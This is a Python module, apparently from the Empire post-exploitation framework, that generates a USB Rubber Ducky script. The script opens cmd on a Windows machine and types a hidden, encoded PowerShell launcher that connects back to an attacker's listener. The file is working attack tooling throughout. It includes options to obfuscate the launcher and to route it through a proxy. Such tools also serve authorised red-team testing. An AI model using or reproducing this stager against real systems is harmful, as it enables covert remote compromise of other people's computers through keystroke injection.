from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'DuckyLauncher',

            'Author': ['@harmj0y'],

            'Description': ('Generates a ducky script that runes a one-liner stage0 launcher for Empire.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'OutFile' : {
                'Description'   :   'File to output duckyscript to.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True.',
                'Required'      :   False,
                'Value'         :   'Token,All,1,home,Encoding,3,home,Launcher,STDIN++,12467'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        
        obfuscateScript = False
        if obfuscate.lower() == "true":
            obfuscateScript = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
        
        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            duckyCode =  "DELAY 3000\n"
            duckyCode += "GUI r\n"
            duckyCode += "DELAY 1000\n"
            duckyCode += "STRING cmd\n"
            duckyCode += "ENTER\n"
            duckyCode += "DELAY 2000\n"
            if obfuscateScript and "launcher" in obfuscateCommand.lower():
                duckyCode += "STRING "+launcher+" \n"
            else:
                enc = launcher.split(" ")[-1]
                duckyCode += "STRING powershell -W Hidden -nop -noni -enc "+enc+" \n"
            duckyCode += "ENTER\n"

            return duckyCode
